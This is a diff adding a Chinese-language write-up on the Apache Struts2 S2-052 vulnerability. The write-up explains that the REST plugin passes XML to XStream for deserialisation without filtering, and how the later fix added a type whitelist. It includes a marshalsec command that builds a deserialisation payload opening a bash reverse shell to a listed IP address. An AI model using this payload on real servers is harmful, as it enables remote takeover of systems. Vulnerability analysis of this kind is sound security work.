@@ -1103,15 +1103,47 @@ xxx.action?redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false
 <a name="s2-052"></a>
 ## S2-052
 
+官方漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-052
+
+影响版本：`Struts 2.1.6` - `Struts 2.3.33`, `Struts 2.5` - `Struts 2.5.12`
+
 ## 漏洞复现与分析
 
+下面使用Struts2 `2.3.33`版本自带的示例应用`struts2-rest-showcase`进行调试分析。
 
+从漏洞公告可获悉，该漏洞与OGNL表达式无关，而是由于`REST plugin`插件在处理`xml`类型的请求数据时，没有进行任何类型的过滤，故可构造恶意xml数据使XStream进行不安全的反序列化，从而达到RCE。
+
+`struts2-rest-plugin`是使Struts2实现REST API的插件。它通过`Content-Type`或`URI后缀名`来识别不同的请求数据类型，然后根据请求数据类型用不同的实现类去处理。关键代码如下：
+
+<img src="pic/struts2_s2-052_3.png">
+
+<img src="pic/struts2_s2-052_4.png">
+
+<img src="pic/struts2_s2-052_5.png">
+
+跟进`XStreamHandler#toObject()`方法，发现调用了`XStream#fromXML()`方法对请求数据进行反序列化。
+
+<img src="pic/struts2_s2-052_6.png">
+
+`struts-rest-plugin-2.3.33`依赖的XStream的版本是`1.4.8`。故可以使用`marshalsec`生成`ImageIO`利用链的payload进行RCE的漏洞利用。
 
 ## 可回显PoC
 
+对于xstream的反序列化命令执行回显，本人暂时不知道如何实现。<br>
+下面使用`marshalsec`工具生成反弹shell的exploit：
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO "/bin/bash" "-c" "bash -i >& /dev/tcp/192.168.166.233/443 0>&1"
+```
 
+<img src="pic/struts2_s2-052_1.png">
+   
+<img src="pic/struts2_s2-052_2.png">
 
 ## 漏洞修复
+
+在`struts2-rest-plugin-2.3.34`版本中，将XStream升级到了`1.4.10`版本，且按照XStream官方的推荐(https://x-stream.github.io/security.html)，使用了白名单的方式指定可以反序列化的类型。
+
+<img src="pic/struts2_s2-052_7.png">
 
 
 <a name="s2-053"></a>
